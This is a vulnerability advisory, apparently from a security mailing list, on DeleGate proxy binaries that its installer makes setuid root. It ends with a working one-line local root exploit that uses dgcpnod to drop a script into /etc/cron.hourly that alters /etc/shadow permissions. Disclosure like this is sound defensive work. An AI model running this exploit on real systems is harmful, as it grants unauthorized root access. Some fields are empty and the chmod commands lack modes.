Cashdollar, @_larry0 Date: Advisory: Download Sites: http://delegate.hpcc.jp/delegate/  http://delegate.org/delegate/ Vendor: National Institute of Advanced Industrial Science and Technology Vendor Notified: Vendor Contact: y.sato@...egate.org ysato@....go.jp Description: DeleGate is a multipurpose proxy server which relays  various application protocols on TCP/IP or UDP/IP, including HTTP, FTP,  Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and  more. DeleGate mediates communication between servers and clients where  direct communication is impossible, inefficient, or inconvenient.  Vulnerability: Installation of delegate sets some binaries setuid root, at least  one of these binaries can be used to escalate the privileges of a local  user.  The binary dgcpnod creates a node allowing a local unprivileged  user to create files anywhere on disk.   By creating a file in  /etc/cron.hourly a local user can execute commands as root.  Installation of software via source or binary distribution with option  to not run as root results in a script set-subin.sh to run setting the  setuid bit on four binaries.  In Linux distributions where this software  is part of the package list these binaries are not setuid root. (archlinux)   From documentation http://www.delegate.org/delegate/newbies-ja.shtml  (translated to english): Go is included in the binary distribution, or DGROOT that you can build  from the source to the location of preference, and then change the name  if necessary. This is the DgRoot. In addition, if needed, you can rename  the executable file of DeleGate to the name of the preference. This is  the DgExe. "In Unix version subin in if you want to use "(such as when using a  privileged port), do the following.     (3-2uk) $ cd DgRoot / subin            $ Sh setup-subin.sh  ls -l total -r-sr-s--- 1 root  larry Oct 31  dgbind -r-sr-s--- 1 root  larry Oct 31  dgchroot -r-sr-s--- 1 root  larry Oct 31  dgcpnod -rwxr-xr-x 1 larry larry Oct 31  dgdate -rwxr-xr-x 1 larry larry  Oct 31  dgforkpty -r-sr-s--- 1 root  larry Oct 31  dgpam -rwxr-x--- 1 larry larry    Oct 27  setup-subin.sh  This script sets the setuid bit on four binaries:  cat setup-subin.sh #!/bin/sh  SUBINS="dgpam dgbind dgchroot dgcpnod" sudo sh -c "chown root $SUBINS; chmod $SUBINS" if [ $? != 0 ]; then    su root -c "chown root $SUBINS; chmod $SUBINS" fi CVEID: Exploit Code: $ touch /tmp/rootme; chmod +x /tmp/rootme; ./dgcpnod /tmp/rootme  /etc/cron.hourly/rootme; echo -e '#!/bin/bash \n chmod /etc/shadow'   > /etc/cron.hourly/rootme   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
